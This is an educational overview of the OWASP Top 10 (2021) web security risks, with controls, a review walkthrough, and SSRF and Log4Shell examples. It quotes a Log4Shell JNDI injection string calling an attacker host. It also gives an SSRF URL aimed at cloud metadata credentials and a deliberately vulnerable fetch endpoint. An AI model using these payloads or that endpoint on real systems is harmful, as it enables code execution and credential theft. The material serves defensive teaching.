---
id: SEC-004
title: "OWASP Top 10 Overview"
category: "Security"
tier: tier-2-networking-security
folder: SEC-security
difficulty: ★☆☆
depends_on: SEC-001, SEC-002, SEC-003
used_by: SEC-011, SEC-012, SEC-013, SEC-028, SEC-033, SEC-034, SEC-035
related: SEC-001, SEC-002, SEC-003, SEC-007, SEC-011, SEC-012, SEC-013
tags:
  - security
  - owasp
  - web-security
  - vulnerabilities
status: complete
version: 4
layout: default
parent: "Security"
grand_parent: "Technical Mastery"
nav_order: 4
permalink: /technical-mastery/sec/owasp-top-10-overview/
---

⚡ TL;DR - The OWASP Top 10 is the industry-standard list
of the most critical web application security risks,
updated every 3-4 years based on real breach data.
Current version (2021): A01 Broken Access Control, A02
Cryptographic Failures, A03 Injection, A04 Insecure Design,
A05 Security Misconfiguration, A06 Vulnerable and Outdated
Components, A07 Identification and Authentication Failures,
A08 Software and Data Integrity Failures, A09 Security
Logging and Monitoring Failures, A10 Server-Side Request
Forgery (SSRF). Broken Access Control moved from #5 to #1:
it is now the most commonly found vulnerability across all
web applications. Each entry in the OWASP Top 10 covers
thousands of specific vulnerabilities - the Top 10 is a
risk category list, not a specific vulnerability list. Every
web application MUST be reviewed against all 10 categories.
If your application has none of these, it is already better
than ~90% of production web applications.

---

| #004 | Category: Security | Difficulty: ★☆☆ |
|:---|:---|:---|
| **Depends on:** | Security Problem, CIA Triad, Attacker Mindset | |
| **Used by:** | SQL Injection, XSS, CSRF, Authentication Failures, JWT, CORS | |
| **Related:** | Security Problem, Attacker Mindset, Defense in Depth, all injection entries | |

---

### 🔥 The Problem This Solves

**WORLD WITHOUT IT:**
Without the OWASP Top 10: every developer reinvents the list
of what vulnerabilities to check for. New developers do not
know where to start. Security reviews focus on exotic
vulnerabilities (the interesting ones) and miss the common
ones (the ones that cause the most actual breaches). Code
review checklists are ad-hoc and inconsistent across teams.
With the OWASP Top 10: a shared vocabulary ("is this an
A01 issue?"), a prioritized list based on actual breach
frequency (not theoretical concern), and a starting checklist
for every web application security review. The OWASP Top 10
does not replace deep security knowledge, but it provides
a minimum baseline that every web developer should be able
to apply.

---

### 📘 Textbook Definition

**OWASP (Open Worldwide Application Security Project):**
Non-profit foundation producing free security resources.
The Top 10 is the most cited security standard in web
development. Used in: PCI-DSS compliance (must address
OWASP Top 10), developer training, code review checklists,
penetration testing scope definition, and regulatory
frameworks (NIST, ISO 27001).

**OWASP Top 10 2021 - Full List:**

**A01: Broken Access Control** (was A05 in 2017)
Most commonly found vulnerability. Missing authorization
checks, insecure direct object references (IDOR), path
traversal, CORS misconfiguration, privilege escalation.

**A02: Cryptographic Failures** (was "Sensitive Data Exposure")
Data exposed in transit or at rest due to missing or weak
cryptography. HTTP instead of HTTPS, MD5/SHA1 for passwords,
weak cipher suites, unencrypted PII in database.

**A03: Injection** (was A01 in 2017)
User-controlled data interpreted as commands. SQL injection,
LDAP injection, OS command injection, XSS (HTML injection).
Still extremely common despite decades of awareness.

**A04: Insecure Design** (NEW in 2021)
Security weaknesses in the architecture itself, not the
implementation. Missing threat modeling, no rate limiting
on authentication endpoints, absent business logic controls.

**A05: Security Misconfiguration**
Default credentials, unnecessary features enabled, verbose
error messages, missing security headers, open cloud storage
buckets (S3, Azure Blob).

**A06: Vulnerable and Outdated Components**
Libraries, frameworks, and software with known CVEs in
production. Log4Shell exploited a library used by millions.

**A07: Authentication Failures** (was "Broken Authentication")
Weak passwords, no MFA, credential stuffing, session fixation,
insecure session tokens, JWT vulnerabilities.

**A08: Software and Data Integrity Failures** (NEW in 2021)
Code and infrastructure that does not verify integrity.
Insecure deserialization, insecure CI/CD pipelines, lack
of integrity verification for updates (SolarWinds).

**A09: Security Logging and Monitoring Failures**
Attacks not detected because logging is absent or incomplete.
The "silent killer" - not a direct vulnerability but enables
all other attacks to go undetected.

**A10: SSRF (Server-Side Request Forgery)** (NEW in 2021)
Server makes HTTP requests to attacker-controlled URLs.
Can reach internal metadata services (AWS IMDSv1), internal
services not exposed externally, local file system.

---

### ⏱️ Understand It in 30 Seconds

**One line:**
OWASP Top 10 (2021) = the 10 most common web vulnerability
categories based on real breach data: Broken Access Control
leads, followed by Cryptographic Failures, Injection,
Insecure Design, Misconfiguration, Outdated Components,
Auth Failures, Integrity Failures, Logging Failures, SSRF.

**One analogy:**
> The OWASP Top 10 is like NHTSA crash data for car safety:
> based on thousands of real accidents, it tells you which
> failure modes cause the most deaths. You design your car
> (application) to specifically address these known-high-risk
> failure modes. Not every possible failure - the ones that
> actually kill people (cause the most actual breaches).

---

### 🔩 First Principles Explanation

**Why the OWASP Top 10 keeps changing (and why that matters):**

```
2013 OWASP TOP 10 → 2017 TOP 10 → 2021 TOP 10

SQL INJECTION: #1 in 2013 → #1 in 2017 → #3 in 2021
  Still common, but ORMs and parameterized queries
  reduced frequency in well-maintained applications.
  Moved down because broken access control became
  more widespread relative to injection.

BROKEN ACCESS CONTROL: #5 in 2013 → #5 in 2017 → #1 in 2021
  WHY it became #1: the shift to APIs.
  Web 1.0: server-rendered pages, authorization checked
    before rendering the page. Server controls what you see.
  API era: client-side React/Vue/Angular. Server returns data
    that the client decides to show. Authorization must be
    checked in the API, not in the template rendering logic.
  Many developers: moved auth from templates to APIs but
    forgot to add authorization checks to the APIs.
  Result: 30-40% of API endpoints under-authorized.
  IDOR became the most common finding in bug bounty programs.

NEW IN 2021: Insecure Design (A04)
  NOT a new attack type - recognition that architectural
  decisions create vulnerabilities that CANNOT be patched.
  A03 Injection can be fixed with parameterized queries.
  A04 Insecure Design cannot be patched - requires redesign.
  Example: authentication endpoint with no rate limiting.
    You cannot "patch" unlimited brute-force attempts -
    you must add rate limiting to the design.
  OWASP acknowledging: security testing alone is insufficient
  if the design itself is insecure.

NEW IN 2021: SSRF (A10)
  Why it appeared now: cloud adoption.
  Cloud services use metadata services (AWS IMDSv1):
    HTTP endpoint at 169.254.169.254 returns:
    - Instance role credentials (AWS access keys)
    - User data (may contain secrets)
  SSRF allows attacking this endpoint from a web server
  that makes user-controlled HTTP requests.
  With IMDSv1 credentials: full AWS API access = data breach.
  Log4Shell (2021) included an SSRF vector via JNDI.
  SSRF became critical as cloud adoption made metadata
  services ubiquitous.
```

---

### 🧪 Thought Experiment

**SCENARIO: Apply OWASP Top 10 review to a simple API**

```python
# A typical e-commerce order API.
# Walk through OWASP 2021 A01-A10:

@app.get("/orders/{order_id}")
async def get_order(order_id: int, user_token: str = Header()):
    """
    A01 Broken Access Control:
    QUESTION: Is there an authorization check?
    user = get_user(user_token)
    order = db.get_order(order_id)
    if order.user_id != user.id:    # CHECK PRESENT?
        raise 403
    """

@app.post("/orders")
async def create_order(items: list, user_token: str = Header()):
    """
    A02 Cryptographic Failures:
    QUESTION: Is user_token stored or logged? If so, how?
    - NEVER log auth tokens (plain text credential exposure)
    - If stored in DB: must be hashed (not plain text)

    A03 Injection:
    QUESTION: Are items validated before DB query?
    - If using raw SQL: parameterized? or string concat?
    - Using ORM: mostly safe, but check raw() queries

    A04 Insecure Design:
    QUESTION: Is there a rate limit on order creation?
    - No rate limit: automated bot can create 10,000 orders
    - Business logic: can a user order 1,000,000 of same item?

    A05 Misconfiguration:
    QUESTION: What do error responses contain?
    - Stack traces in prod? = reveals internal paths, versions
    - Default debug mode? = verbose errors
    """

@app.get("/admin/orders")
async def admin_get_all_orders(admin_token: str = Header()):
    """
    A07 Authentication Failures:
    QUESTION: How is admin_token validated?
    - JWT with strong secret?
    - Expiry checked?
    - Revocable if compromised?

    A09 Logging and Monitoring Failures:
    QUESTION: Is access to /admin/ logged?
    - Every admin action should be in audit log
    - Unauthorized access attempts should alert
    """
# RUNNING THROUGH ALL 10: takes 30 minutes per endpoint.
# A security review checklist per OWASP = minimum bar.
```

---

### 🧠 Mental Model / Analogy

> OWASP Top 10 is like building code for houses.
> Building codes don't specify every possible design -
> they specify the minimum safety requirements based on
> what has killed people in the past (fires, structural
> collapse, electrical failures). OWASP Top 10 specifies
> the minimum security requirements based on what has
> caused real breaches. You can build a house that is
> technically "to code" (passes OWASP Top 10 review) and
> still have a mediocre design. But a house "not to code"
> (fails OWASP Top 10 checks) will almost certainly have
> a major safety failure. The Top 10 is the minimum,
> not the goal.

---

### 📶 Gradual Depth - Five Levels

**Level 1 - What it is (anyone can understand):**
OWASP Top 10 is a list of the 10 most common ways web
applications get hacked. Every developer should know it
because these are the mistakes that cause the most real
security breaches.

**Level 2 - How to use it (junior developer):**
Use it as a code review checklist. For every feature:
does it have access control (A01)? Is sensitive data
encrypted (A02)? Are database queries parameterized (A03)?
Is error handling clean (A05)? Are all dependencies
up to date (A06)? Is authentication strong (A07)?

**Level 3 - How it works (mid-level engineer):**
Map each OWASP category to specific security controls in
your tech stack. A01 → Spring Security, RBAC. A02 → TLS
configuration, Bcrypt, HashiCorp Vault. A03 → JPA/Hibernate
parameterized queries, input validation. A06 → Dependabot,
Snyk. A07 → OAuth 2.0, MFA, Argon2. Run SAST (Semgrep,
CodeQL) with OWASP-specific rulesets in CI/CD.

**Level 4 - Why it was designed this way (senior/staff):**
The Top 10 is intentionally high-level because the specific
vulnerability landscape changes faster than the category
landscape. SQL injection (A03) covered hundreds of specific
techniques in 2013 and still covers hundreds in 2021, but
the specific bypass techniques and databases have changed
completely. By categorizing at the "Injection" level, the
Top 10 remains relevant across technology generations.
The limitation: high-level categories miss specific
vulnerabilities (OWASP Top 10 would not catch a specific
JWT algorithm confusion attack - that requires deep JWT
knowledge beyond "A07").

**Level 5 - Mastery (distinguished engineer):**
OWASP Top 10 is a risk prioritization framework, not a
complete security standard. Compliance with Top 10 does
NOT mean secure. The Top 10 covers "known common" but not
"novel" or "business logic" vulnerabilities. A payment
processor can pass OWASP Top 10 review but still be
vulnerable to: race conditions in balance transfers
(A04 - Insecure Design, but requires deep domain knowledge),
timing attacks on HMAC comparison (cryptographic correctness
beyond A02), and logic flaws in discount code redemption
(business logic outside OWASP scope). At staff level:
OWASP Top 10 is the floor, not the ceiling. It is used
as a compliance baseline (PCI-DSS, SOC 2 reference) but
actual security requires threat modeling, penetration
testing, and business logic review beyond what the Top 10 covers.

---

### ⚙️ How It Works (Mechanism)

**OWASP Top 10 2021 with severity, prevalence, and controls:**

```
A01 Broken Access Control
  CVSS severity: High (frequently Critical)
  Prevalence: 94% of applications tested had some form
  Primary control: Deny by default + authorization check
    on every API endpoint + RBAC
  Example: IDOR, path traversal, CORS misconfiguration

A02 Cryptographic Failures
  CVSS severity: High-Critical (data exposure)
  Prevalence: ~55% of apps expose sensitive data
  Primary control: TLS 1.3 everywhere, AES-256 at rest,
    Bcrypt/Argon2 for passwords, NEVER MD5/SHA1 for auth
  Example: HTTP instead of HTTPS, plain text passwords

A03 Injection
  CVSS severity: Critical
  Prevalence: ~65% of tested apps have some injection
  Primary control: parameterized queries, input validation,
    WAF for known patterns
  Example: SQLi, LDAP injection, OS command injection

A04 Insecure Design
  CVSS severity: Variable (design-dependent)
  Prevalence: NEW category - hard to quantify
  Primary control: threat modeling at design phase,
    rate limiting, secure defaults in frameworks
  Example: no account lockout, missing CAPTCHA

A05 Security Misconfiguration
  CVSS severity: Medium-High
  Prevalence: ~90% of apps have some misconfiguration
  Primary control: Infrastructure-as-Code (configured
    correctly by default), security scanning of configs,
    disable defaults (default credentials, debug mode)
  Example: S3 public bucket, debug error messages in prod

A06 Vulnerable Components
  CVSS severity: Critical (when CVE is exploitable)
  Prevalence: almost universal (all apps have dependencies)
  Primary control: SCA (Software Composition Analysis),
    automated dependency updates (Dependabot, Snyk)
  Example: Log4Shell (Log4j 2.14.1 CVE-2021-44228)

A07 Auth Failures
  CVSS severity: High-Critical
  Prevalence: ~70% of tested apps
  Primary control: MFA, strong password policy, secure
    session management, account lockout
  Example: credential stuffing, session fixation, JWT flaws

A08 Integrity Failures
  CVSS severity: High-Critical
  Prevalence: NEW - includes deserialization + CI/CD
  Primary control: code signing, CI/CD access control,
    deserialization allowlist
  Example: SolarWinds supply chain, insecure deserialization

A09 Logging Failures
  CVSS severity: Medium (enables all other attacks)
  Prevalence: ~95% of apps have logging gaps
  Primary control: structured logging, SIEM, anomaly
    detection, centralized audit trail
  Example: no log of failed logins, no access audit trail

A10 SSRF
  CVSS severity: High-Critical (cloud environments)
  Prevalence: NEW - rapidly increasing with cloud adoption
  Primary control: allowlist of permitted external URLs,
    IMDSv2 (token-based), network egress controls
  Example: fetch user avatar from URL → internal metadata API
```

---

### 💻 Code Example

**SSRF (A10) - The newest and least understood Top 10 item:**

```python
# BAD: SSRF - server fetches attacker-controlled URL.
# Attacker provides: url="http://169.254.169.254/latest/meta-data/
#   iam/security-credentials/my-role"
# Server returns: AWS temporary credentials (access key + secret)
# With these credentials: attacker has full AWS API access.
@app.get("/preview")
async def preview_url(url: str):
    # VULNERABLE: no validation of what 'url' points to
    async with httpx.AsyncClient() as client:
        response = await client.get(url)  # SSRF!
    return {"content": response.text}

# GOOD: SSRF prevention via allowlist + DNS resolution check
import ipaddress, socket

ALLOWED_DOMAINS = {"example.com", "cdn.example.com"}
BLOCKED_RANGES = [
    ipaddress.ip_network("10.0.0.0/8"),      # Private
    ipaddress.ip_network("172.16.0.0/12"),   # Private
    ipaddress.ip_network("192.168.0.0/16"),  # Private
    ipaddress.ip_network("169.254.0.0/16"),  # Link-local/metadata
    ipaddress.ip_network("127.0.0.0/8"),     # Loopback
]

def is_safe_url(url: str) -> bool:
    from urllib.parse import urlparse
    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https"):
        return False
    hostname = parsed.hostname
    if hostname not in ALLOWED_DOMAINS:
        return False
    # Resolve DNS and check the resolved IP is not internal
    try:
        ip = ipaddress.ip_address(socket.gethostbyname(hostname))
        for blocked in BLOCKED_RANGES:
            if ip in blocked:
                return False  # DNS rebinding attack protection
    except (socket.gaierror, ValueError):
        return False
    return True

@app.get("/preview")
async def preview_url(url: str):
    if not is_safe_url(url):
        raise HTTPException(status_code=400,
                            detail="URL not permitted")
    async with httpx.AsyncClient() as client:
        response = await client.get(url)
    return {"content": response.text}
```

---

### ⚖️ Comparison Table

| Category | 2017 Rank | 2021 Rank | Direction | Key Change |
|:---|:---|:---|:---|:---|
| **Broken Access Control** | #5 | #1 | ↑ | API era: auth missing from APIs |
| **Cryptographic Failures** | #3 | #2 | ↑ | Renamed (was Sensitive Data Exposure) |
| **Injection** | #1 | #3 | ↓ | ORMs reduced raw SQL injection |
| **Insecure Design** | N/A | #4 | NEW | Architecture-level vulnerabilities |
| **Misconfiguration** | #6 | #5 | ↑ | Cloud misconfig (S3, containers) |
| **Outdated Components** | #9 | #6 | ↑ | Log4Shell impact elevated this |
| **Auth Failures** | #2 | #7 | ↓ | Better tooling (MFA, OAuth) |
| **Integrity Failures** | N/A | #8 | NEW | Supply chain + deserialization |
| **Logging Failures** | #10 | #9 | ↑ | Renamed, stays critical |
| **SSRF** | N/A | #10 | NEW | Cloud metadata services vulnerability |

---

### ⚠️ Common Misconceptions

| Misconception | Reality |
|:---|:---|
| Passing OWASP Top 10 means the application is secure | OWASP Top 10 is a minimum baseline covering the most COMMON vulnerability categories. It does NOT cover: business logic flaws (an attacker who finds a way to use a valid coupon code 1,000 times), advanced cryptographic attacks (timing attacks, padding oracles), novel techniques not yet common enough for the list, or application-specific threats. An application "compliant" with OWASP Top 10 can still have dozens of exploitable vulnerabilities in business logic or application-specific logic. |
| OWASP Top 10 is a checklist that can be automated | A01 (Broken Access Control) requires understanding business logic: which users should access which resources. This cannot be automated - it requires manual review. A SAST tool can detect that there is no authorization check on an endpoint, but cannot determine if the absence is intentional (public endpoint) or accidental (forgot the check). Similarly, A04 (Insecure Design) requires architectural review. SAST/DAST automate finding ~30-40% of OWASP issues; the rest require human review. |

---

### 🚨 Failure Modes & Diagnosis

**Failure: A06 - Outdated Component exploited (Log4Shell pattern)**

**Symptom:** Server logs show unusual entries like:
`${jndi:ldap://attacker.com/a}` in User-Agent or request parameters.
Server makes outbound LDAP/DNS connections to unknown external IPs.
Java process spawns unexpected child processes.

**Diagnosis:**
```bash
# Check for Log4Shell exploit attempts in logs
grep -r '\${jndi:' /var/log/app/

# Identify Log4j version in use
find / -name "log4j*.jar" 2>/dev/null
# Look for version in MANIFEST.MF within the jar
jar tf log4j-core-*.jar | grep MANIFEST
jar xf log4j-core-*.jar META-INF/MANIFEST.MF
cat META-INF/MANIFEST.MF | grep Implementation-Version

# Check for outbound unexpected connections
netstat -an | grep ESTABLISHED | grep -v ':443\|:80\|:5432'
```

**Fix Pattern:**
```
Immediate: upgrade log4j-core to 2.17.1+ (patches CVE-2021-44228)
If cannot upgrade immediately:
  - Set LOG4J_FORMAT_MSG_NO_LOOKUPS=true (env var mitigation)
  - Or add -Dlog4j2.formatMsgNoLookups=true JVM arg
Prevention: SCA in CI/CD (Snyk, Dependabot) alerts on CVEs
  BEFORE deploying vulnerable dependencies.
```

---

### 🔗 Related Keywords

**Goes deeper on each OWASP category:**
- `SQL Injection` - A03 in depth
- `XSS (Cross-Site Scripting)` - A03 subtype
- `CSRF` - A01 in depth (access control)
- `JWT Anti-Patterns` - A07 in depth
- `SSRF` - A10 in depth
- `Security Misconfiguration` - A05 in depth

---

### 📌 Quick Reference Card

```
┌──────────────────────────────────────────────────────────┐
│ OWASP 2021   │ A01 Broken Access Control (was #5 → #1)  │
│ TOP 10       │ A02 Cryptographic Failures                │
│              │ A03 Injection (was #1 → #3)               │
│              │ A04 Insecure Design (NEW)                 │
│              │ A05 Security Misconfiguration             │
│              │ A06 Vulnerable Components                 │
│              │ A07 Authentication Failures               │
│              │ A08 Integrity Failures (NEW)              │
│              │ A09 Logging/Monitoring Failures           │
│              │ A10 SSRF (NEW - cloud era)                │
├──────────────┼───────────────────────────────────────────┤
│ #1 INSIGHT   │ Broken Access Control = #1 because APIs   │
│              │ are missing authorization checks          │
├──────────────┼───────────────────────────────────────────┤
│ MINIMUM BAR  │ Review EVERY app against all 10           │
│              │ SAST catches ~40%, rest = manual          │
└──────────────────────────────────────────────────────────┘
```

---

### 💎 Transferable Wisdom

**Reusable Engineering Principle:**
"Risk registers should be based on frequency, not severity."
The OWASP Top 10 is ranked by: how often the vulnerability
class appears in real applications weighted by its impact.
SQL injection might have maximum impact (critical CVSS) but
appear in fewer modern applications (ORMs help). IDOR appears
in nearly every application with user data (API era). Top 10
prioritizes by likelihood × impact. This is how all risk
registers should be maintained: not by "what is the worst
thing that could happen" (which creates security theater
around zero-probability threats) but by "what is most likely
to cause actual harm." The same principle: operational
runbooks should document the most COMMON failure modes, not
the most impressive-sounding ones.

---

### 💡 The Surprising Truth

A09 (Security Logging and Monitoring Failures) is the only
OWASP Top 10 category that is not itself a vulnerability -
it is the absence of detection capability. It appears in
the Top 10 because the average time to detect a breach
without logging is 207 days (Mandiant 2023). During those
207 days, an attacker with access to your database can
exfiltrate ALL of it, multiple times. A09 is ranked because
it enables every other OWASP category to succeed silently.
The practical consequence: you can have A01-A08 perfectly
controlled, but if you have A09 (no monitoring), you will
not know when one of those controls fails. Security is
not complete without the detection layer.

---

### ✅ Mastery Checklist

**You've mastered this when you can:**
1. **LIST** the OWASP 2021 Top 10 from memory with one
   example of each category.
2. **EXPLAIN** why A01 Broken Access Control moved from
   #5 to #1 (API era, authorization missing from API endpoints).
3. **IDENTIFY** SSRF (A10) in code: server making HTTP
   requests to user-controlled URLs, risk to cloud metadata.
4. **BUILD** a per-PR security review checklist based on
   OWASP Top 10 categories for your tech stack.

---

### 🎯 Interview Deep-Dive

**Q: What is the OWASP Top 10 and what do you think is the
most important item in the current list?**

*Why they ask:* Tests security baseline knowledge and ability
to have an opinion backed by reasoning.

*Strong answer includes:*
- Brief overview of OWASP Top 10 as data-driven prioritization
  of web vulnerability categories.
- For "most important": A01 Broken Access Control (became #1
  because the industry shifted to APIs and many developers
  forgot to add authorization checks to API endpoints that
  previously were protected by server-side rendering).
  Every user data API must: authenticate (who are you?),
  then authorize (are you allowed to access THIS specific
  resource?). Many implementations: authenticate but not
  authorize → IDOR → most common bug bounty finding.
- For "runner up": A09 Logging Failures - not a vulnerability
  itself, but enables all other attacks to succeed silently.
  207-day average dwell time without logging = 207 days of
  undetected data exfiltration.
- Shows depth: the candidate knows OWASP is ranked by
  frequency × impact, not just CVSS severity.